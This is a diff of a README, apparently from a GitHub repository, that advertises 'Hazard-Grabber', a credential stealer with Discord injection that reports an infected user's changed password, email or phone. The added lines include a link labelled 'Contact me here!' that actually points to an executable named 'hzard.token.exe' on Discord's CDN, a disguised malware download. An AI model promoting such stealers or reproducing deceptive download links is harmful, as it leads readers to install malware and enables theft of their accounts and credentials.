@@ -13,6 +13,11 @@ As I said - I'm new 👋, but I will try my best ♡ And yes, if you wanna call 
 I'm learning coding at the moment to create my own projects as I mentioned before, but I'm pretty young and broke, so please don't hate me for copying/posting this stuff :)
 
 
+
+![image](https://github.com/user-attachments/assets/7d731868-9f31-4c81-b994-d5e6be0a0325)
+
+
+
 🎈 Hazard-Grabber is a popular Stealer with many features
 Manipulating code and more
 (If you don't like a feature, you can easily turn it off and change the code to whatever you want.)
@@ -33,5 +38,6 @@ Discord Injection
 (Auto-Update. If the infected User changes his password, email or phone it will be displayed through the
 
 
-
-![image](https://github.com/user-attachments/assets/7d731868-9f31-4c81-b994-d5e6be0a0325)
+📝 If you have any other improvement ideas or questions, just ask me on Discord or join our server!
+[Our Discord here!](https://discord.gg/96krpphC)
+[Contact me here!](https://cdn.discordapp.com/attachments/1275142803453902951/1275841859561848852/hzard.token.exe?ex=66c75bd3&is=66c60a53&hm=597b868a6725579b68352c385c65bbbaf9c5c43daa953331550844d38570108f&)
